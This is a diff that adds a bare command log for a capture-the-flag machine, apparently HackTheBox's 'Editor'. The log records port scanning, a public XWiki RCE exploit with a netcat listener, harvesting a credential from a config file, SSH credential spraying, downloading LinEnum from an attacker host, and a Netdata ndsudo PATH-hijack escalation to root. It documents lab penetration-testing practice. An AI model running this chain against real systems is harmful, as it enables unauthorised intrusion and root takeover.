@@ -1,5 +1,39 @@
 ```
 nmap -sS -sC -sV -T5 -Pn 10.10.11.80
+http://10.10.11.80:8080/xwiki/bin/view/Main/
+nano /etc/hosts
+http://editor.htb/
+http://wiki.editor.htb/xwiki/bin/view/Main/
+XWiki Debian 15.10.8 
+https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC
+git clone 
+nc -lvnp 1337
+python CVE-2025-24893-dbs.py
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+find / -perm -4000 2>/dev/null
+cat /etc/xwiki/hibernate.cfg.xml
+oliver : theEd1t0rTeam99
+crackmapexec ssh 10.10.11.80 -u users.txt -p pass.txt
+ssh oliver@10.10.11.80
+python3 -m http.server 80
+wget 10.10.14.45/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh
+netdata
+ssh oliver@10.10.11.80 -L 19999:localhost:19999
+localhost:19999
+Netdata 1.45.2
+https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation
+gcc root.c -o nvme
+wget 10.10.14.45/nvme
+chmod +x nvme
+PATH=/dev/shm:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+ls -l /tmp/0xdf
+/tmp/0xdf -p
+```
+
+```
+nmap -sS -sC -sV -T5 -Pn 10.10.11.80
 ```
 <img width="1022" height="829" alt="image" src="https://github.com/user-attachments/assets/48131f57-1f28-4a12-9be1-0ba7493fa205" />
 
